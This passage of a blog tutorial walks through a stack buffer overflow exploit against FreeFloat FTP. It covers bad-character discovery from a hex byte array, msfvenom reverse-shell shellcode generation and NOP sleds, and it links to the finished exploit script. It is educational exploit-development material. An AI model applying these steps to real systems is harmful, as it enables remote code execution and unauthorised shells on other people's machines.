<span class="s2">"</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">9b</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">9e</span><span class="se">\x</span><span class="s2">9f</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">a1</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">aa</span><span class="se">\x</span><span class="s2">ab"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">b5</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">be"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">d1"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">dc</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">e4"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">ee</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">f7"</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">00"</span></code></pre></figure>

<p>Since <strong>\x00</strong> is a common bad char, we will remove it in advance and add the rest of the hex values into our payload.</p>

<p><img src="/musubi/assets/binary0x01/20.png" alt="20" /></p>

<p>Close the debugger, restart the application, reattach and resume the application. Run our modified exploit code. Right click on the <strong>ESP</strong> and go to follow dump and we will get something like this.</p>

<p><img src="/musubi/assets/binary0x01/21.png" alt="21" /></p>

<p>We can see all of the hex values in the dump. However, after <strong>\x09</strong> , <strong>\x0a</strong> is nowhere to be found. This indicates that <strong>\x0a</strong> is a possible bad character. We then add it into a list of bad chars.</p>

<p>Update our exploit code and repeat the step to find bad chars until no more bad chars left.</p>

<p><img src="/musubi/assets/binary0x01/22.png" alt="22" /></p>

<p><img src="/musubi/assets/binary0x01/23.png" alt="23" /></p>

<p><img src="/musubi/assets/binary0x01/24.png" alt="24" /></p>

<p><img src="/musubi/assets/binary0x01/25.png" alt="25" /></p>

<p>We found out that the bad chars for our shellcode for this application is : <strong>\x00</strong> , <strong>\x0a</strong> , <strong>\x0d</strong></p>

<p>(p/s: we don’t need to change the value of our <strong>EIP</strong>)</p>

<p><img src="/musubi/assets/binary0x01/26.png" alt="26" /></p>

<p><img src="/musubi/assets/binary0x01/27.png" alt="27" /></p>

<h2 id="5-crafting-shellcode">5. Crafting shellcode</h2>

<p>In this case, we will be using <code class="language-plaintext highlighter-rouge">msfvenom</code> for our shellcode. Using below command, we can create a reverse shell shellcode which will not contains our bad chars.</p>

<p><img src="/musubi/assets/binary0x01/28.png" alt="28" /></p>

<p>Add our shellcode into our payload</p>

<p><img src="/musubi/assets/binary0x01/29.png" alt="29" /></p>

<h2 id="6-add-few-nopsleds-before-the-shellcode">6. Add few NOPsleds before the shellcode</h2>

<p>Okay, we have overwritten <strong>EIP</strong>, add some padding so we can reach our <strong>ESP</strong> buffer and then we place our shellcode. Then that’s all…, right?</p>

<p>But why we need to add <strong>NOPsleds</strong> before our shellcode? What are <strong>NOPsleds</strong> and what impact it can give to the effectiveness of our exploit?</p>

<p>Basically, a <strong>NOP</strong> is a no operation opcode, which means, it does nothing and move on to the next instruction (opcodes). <strong>NOPsleds</strong> or <strong>NOP slides</strong> is a series of NOPs which does nothing. However, these <strong>NOPsleds</strong> are crucial in the effectiveness of the execution of our shellcode.</p>

<p>Let’s compare both flows of buffer overflow exploit and the output when I tested both of them;</p>

<p><code class="language-plaintext highlighter-rouge">Buffer | EIP | padding before ESP | shellcode</code> <strong>–&gt; Exploit failed</strong></p>

<p><strong>VS</strong></p>

<p><code class="language-plaintext highlighter-rouge">Buffer | EIP | padding before ESP | nopsleds | shellcode</code> <strong>–&gt; Exploit succeeded</strong></p>

<p>The best explanation I can give is ;</p>

<p><strong>NOPsleds</strong> can increase the accuracy of the target address. So, if the program lands in the <strong>NOPsleds</strong> after the controlled <strong>EIP</strong>, it will continue doing nothing until it reaches the shellcode thus can reduce the risk of the shellcode to be overwritten / corrupted by the program instructions.</p>

<p>Now, open up our listener and then run our finished exploit code. (Get it on <a href="https://raw.githubusercontent.com/yunaranyancat/62-69-6e-61-72-79-20-65-78-70-6c-6f-69-74-61-74-69-6f-6e/master/FreeFloat%20FTP/dir.py">github</a>)</p>

<p><img src="/musubi/assets/binary0x01/finalexploit.gif" alt="end" /></p>

<h3 id="conclusion-">Conclusion :</h3>

<p>This is the easiest form of buffer overflow, if you are still wondering what is <strong>EIP</strong>, <strong>ESP</strong> , <strong>JMP ESP</strong> etc.. it’s best if you start searching about them online to get a good grasp on the concept demonstrated above.</p>

<p>Thanks and Happy New Year!</p>

<p><img src="/musubi/assets/binary0x01/newyear.gif" alt="ny" /></p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[It is time to play with the most simplest form of binary exploitation, vanilla EIP overwrite buffer overflow with no stack protection.]]></summary></entry></feed>